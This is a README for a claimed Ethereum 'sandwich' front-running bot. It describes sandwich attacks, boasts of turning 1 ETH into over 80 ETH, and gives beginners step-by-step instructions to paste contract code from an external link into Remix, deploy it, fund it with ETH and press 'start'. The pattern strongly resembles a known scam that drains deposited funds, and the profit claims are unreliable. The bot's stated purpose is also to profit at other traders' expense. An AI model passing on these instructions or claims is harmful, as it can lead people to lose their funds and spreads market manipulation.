# Sandwich Bot
This repository contains the code for a sandwich/front-running bot that targets pending buy transactions on the blockchain in order to generate profits.

# Background
In July 2022, I became interested in the topic of "sandwiching" (also known as frontrunning) in the cryptocurrency market. Essentially, in a sandwich attack, a user's bot targets a pending buy transaction on the blockchain. To execute this, a buy order is placed just before the targeted transaction and a sell order is placed just after it, resulting in a profit for the bot.

Over the next few weeks, I coded and tested my own sandwich bot. By early August, I had successfully created and deployed it. Starting with just 1 ETH, I managed to make over 80 ETH, which is equivalent to over $150k, in passive income.

I'm sharing my sandwich bot code for free, but there's a 0.1% fee charged from users' profits that will go to me. I've also included a video tutorial that I previously shared with a few other developers on Discord.

# Usage
Creating your own sandwich/front-running bot is a simple process that requires no prior coding experience. Follow these steps:

Download MetaMask from https://metamask.io/download.html if you haven't already.

Access Remix from https://remix.ethereum.org/.

Create a new file named "bot.sol" in the "contracts" folder.

Copy and paste the code from https://raw.githubusercontent.com/SolidityScribe/Solidity-Sandwich-Bot/main/contract.sol into Remix. If the text isn't colored, try again until it is.

Go to the "Solidity Compiler" tab, select version "0.6.6+commit.6c089d02," and compile bot.sol.

Go to the "DEPLOY & RUN TRANSACTIONS" tab, select the "Injected Web3" environment, and deploy the contract by approving the Metamask contract creation fee.

Copy the contract address and fund it with your desired amount of ETH using MetaMask. Start with at least 0.1 ETH.

After the transaction is confirmed, click the "start" button to run the bot. You can withdraw your ETH at any time by clicking the "Withdraw" button.
